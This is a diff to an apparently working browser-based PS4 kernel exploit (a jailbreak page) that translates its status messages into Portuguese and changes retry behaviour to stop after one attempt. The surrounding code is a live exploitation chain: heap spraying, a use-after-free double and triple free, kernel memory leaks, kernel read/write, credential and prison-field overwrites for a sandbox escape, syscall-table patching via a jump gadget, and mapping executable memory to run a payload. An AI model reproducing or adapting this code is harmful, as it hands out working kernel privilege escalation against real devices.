@@ -127,12 +127,12 @@ let allDone = false;
         const NUM_IOV_WORKER = params.has("iov")
             ? parseInt(params.get("iov"), 10) : 4;
         const NUM_ATTEMPT = params.has("attempts")
-            ? parseInt(params.get("attempts"), 10) : 8;
+            ? parseInt(params.get("attempts"), 10) : 1;
         const NUM_IOV_SPRAY = params.has("spray")
             ? parseInt(params.get("spray"), 10) : 0x100;
         const { key, off } = offsetsFor(navigator.userAgent);
         mark("FW", key || "(not a PS4 UA)");
-        if (!off) { state("no offsets for this firmware", "bad"); return; }
+        if (!off) { state("Sem offsets para este firmware", "bad"); return; }
         mark("FW-STATUS", off.fw_status || "none");
         mark("PLAN", "iov_workers=" + NUM_IOV_WORKER + " attempts=" + NUM_ATTEMPT
             + " spray=" + NUM_IOV_SPRAY
@@ -172,7 +172,7 @@ let allDone = false;
               + (payload[0] === 0xe9 ? "e9-jmp-rel32" : "NOT-e9")
             : "MISSING");
 
-        state("running the primitive...", "warn");
+        state("Executando o primitivo...", "warn");
         await new Promise(r => setTimeout(r, 0));
 
         const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
@@ -227,7 +227,7 @@ let allDone = false;
         // collection landing here instead of on the race. If every cycle sits
         // at the floor, nothing was swept and this experiment did nothing.
         if (pairStatus.promoted && SWEEP_CYCLES > 0) {
-            state("sweeping...", "warn");
+            state("Limpando memória...", "warn");
             const t0 = Date.now();
             let worst = 0;
             for (let i = 0; i < SWEEP_CYCLES; ++i) {
@@ -485,7 +485,7 @@ let allDone = false;
         put(msgDv, 0x10, iovAddr);
         msgDv.setInt32(0x18, NUM_MSG_IOV, true);
 
-        state("setting up...", "warn");
+        state("Configurando...", "warn");
         if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1)
             throw new Error("socketpair failed");
         const iovSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
@@ -553,7 +553,7 @@ let allDone = false;
         const NUM_UIO_WORKER = params.has("uio")
             ? parseInt(params.get("uio"), 10) : 4;
         const TOTAL_WORKERS = NUM_IOV_WORKER + NUM_UIO_WORKER;
-        state("bringing up " + TOTAL_WORKERS + " workers...", "warn");
+        state("Inicializando " + TOTAL_WORKERS + " workers...", "warn");
         for (let i = 0; i < TOTAL_WORKERS; ++i) {
             const name = (i < NUM_IOV_WORKER ? "iov" : "uio")
                 + (i < NUM_IOV_WORKER ? i : i - NUM_IOV_WORKER);
@@ -801,7 +801,7 @@ let allDone = false;
             mark("REFUSING-TO-ARM", "reason=not-rebooted-since-last-committed-run");
             check("console-rebooted-since-last-committed", false,
                 "boot=" + boot + " last=" + lastCommitted + " override=?force=1");
-            state("REBOOT FIRST -- this kernel is still poisoned", "bad");
+            state("Ocorreu um erro no desbloqueio. Por favor, desligue o PS4 e ligue novamente para tentar de novo.", "bad");
             mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
             return;
         }
@@ -821,7 +821,7 @@ let allDone = false;
                     + " reason=" + uncontained);
                 break;
             }
-            state("attempt " + attempt + "...", "warn");
+            state("Tentativa " + attempt + "...", "warn");
             mark("ATTEMPT", attempt + "/" + NUM_ATTEMPT);
 
             const dummy = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
@@ -866,14 +866,9 @@ let allDone = false;
 
             twins = findTwins(MAX_ROUNDS_TWIN);
             if (!twins) {
-                // No socket showed a duplicate tag: either the double free did
-                // not take, or it did and the scan missed it -- indistinguishable
-                // from here (poops.js:4443 says the same). Nothing is KNOWN to be
-                // aliased, so there is nothing to burn. Drop the spent fd, retry.
                 if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
-                mark("ATTEMPT-RETRY", "after=no-twins next="
-                    + (attempt + 1) + "/" + NUM_ATTEMPT);
-                continue;
+                mark("ATTEMPT-FAILED", "after=no-twins");
+                break;
             }
             mark("TWINS", "a=" + twins.a + " b=" + twins.b
                 + " round=" + twins.round);
@@ -930,9 +925,9 @@ let allDone = false;
                 burn(twins.b, "refcount-drive");
                 twins = null;
                 if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
-                mark("ATTEMPT-RETRY", "after=refcount-drive burned="
-                    + burned.size + " next=" + (attempt + 1) + "/" + NUM_ATTEMPT);
-                continue;
+                mark("ATTEMPT-FAILED", "after=refcount-drive burned="
+                    + burned.size);
+                break;
             }
 
             const d2 = sc(SYS.dup, uafSock).i32;
@@ -984,7 +979,7 @@ let allDone = false;
             if (off.k_kl_lock === undefined || off.k_kl_lock === 0) {
                 mark("KQUEUE-SKIPPED", "reason=no-k_kl_lock");
             } else {
-                state("leaking a kqueue...", "warn");
+                state("Vazando kqueue...", "warn");
 
                 freeRthdr(triplets[2]);
                 sc(SYS.sched_yield);
@@ -1375,7 +1370,7 @@ let allDone = false;
         // required below, so the gate on it stays.
         const R1_ON = params.get("r1") !== "0";
         if (!R1_ON && kernelBase && triplets) {
-            state("kread_slow...", "warn");
+            state("Leitura do kernel...", "warn");
             const got = await kreadSlow(kernelBase, 0x20);
             if (got) {
                 const b = [];
@@ -1391,7 +1386,7 @@ let allDone = false;
 
         let kv = null;
         if (kernelBase && triplets && kqFdp) {
-            state("make_karw...", "warn");
+            state("Configurando R/W no kernel...", "warn");
             mark("SHORT-READS", "n=" + shortReads + " gate=" + (R2_ON ? 1 : 0));
 
             const KREAD_TRIES = params.has("kreadtries")
@@ -1684,7 +1679,7 @@ let allDone = false;
                         const CR_NGROUPS = 0x10, CR_RGID = 0x14;
                         const CR_PRISON = 0x30, CR_SCECAPS1 = 0x60, CR_SCECAPS0 = 0x68;
                         const FD_RDIR = 0x10, FD_JDIR = 0x18;
-                        state("sandbox escape...", "warn");
+                        state("Escapando do sandbox...", "warn");
                         {
                             if (sc(SYS.pipe, argAddr).i32 !== -1) {
                                 const escPipe = [argDv.getInt32(0, true),
@@ -1823,7 +1818,7 @@ let allDone = false;
                         if (burned.size) rebootRequired = true;
                     }
 
-                    state("remove_uaf_file...", "warn");
+                    state("Removendo arquivo UAF...", "warn");
                     const uafFp = fget(uafSock);
                     uafFpSaved = uafFp;
                     mark("UAF-FP", "fd=" + uafSock + " fp=" + uafFp);
@@ -2148,7 +2143,7 @@ let allDone = false;
 
                     let kpatched = false;
                     if (jailbroken && kpatch && KPATCH_JMP_SITES.length >= 4) {
-                        state("kernel patches...", "warn");
+                        state("Aplicando patches no kernel...", "warn");
                         const SYSENT_NARG = 0, SYSENT_CALL = 8, SYSENT_THRCNT = 0x2c;
                         const sysent = kernelBase.add32(off.k_sysent_661);
                         const gadget = kernelBase.add32(off.k_jmp_rsi);
@@ -2260,7 +2255,7 @@ let allDone = false;
                     let payloadRunning = false;
                     if (payload && (kpatched || params.get("payload") === "1")
                         && params.get("payload") !== "0") {
-                        state("payload...", "warn");
+                        state("Carregando payload...", "warn");
                         const sz = (payload.length + 0x3fff) & ~0x3fff;
                         const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
                         const entry = new int64(m.lo, m.hi);
@@ -2443,15 +2438,11 @@ let allDone = false;
                 + " reached=" + (triplets ? "triplets" : committed ? "commit" : "none"));
         }
 
-        state(allDone ? "ALL DONE"
-              : kv ? "KERNEL R/W -- REBOOT NEEDED"
-              : kernelBase ? "FAILED IN make_karw -- REBOOT"
-              : triplets ? "FAILED IN leak_kqueue (triple free was OK) -- REBOOT"
-              : committed ? "FAILED IN triple free -- REBOOT"
-              : "no commit", allDone ? "ok" : kv ? "warn" : "bad");
+        state(allDone ? "DESBLOQUEIO CONCLUÍDO COM SUCESSO"
+              : "Ocorreu um erro no desbloqueio. Por favor, desligue o PS4 e ligue novamente para tentar de novo.", allDone ? "ok" : "bad");
     } catch (e) {
         mark("STEP10-FAILED", (e && e.message) ? e.message : String(e));
-        state("FAILED -- see log", "bad");
+        state("Ocorreu um erro no desbloqueio. Por favor, desligue o PS4 e ligue novamente para tentar de novo.", "bad");
     } finally {
 
         if (uafSock) mark("UAF-SOCK-LEFT-OPEN", "fd=" + uafSock);
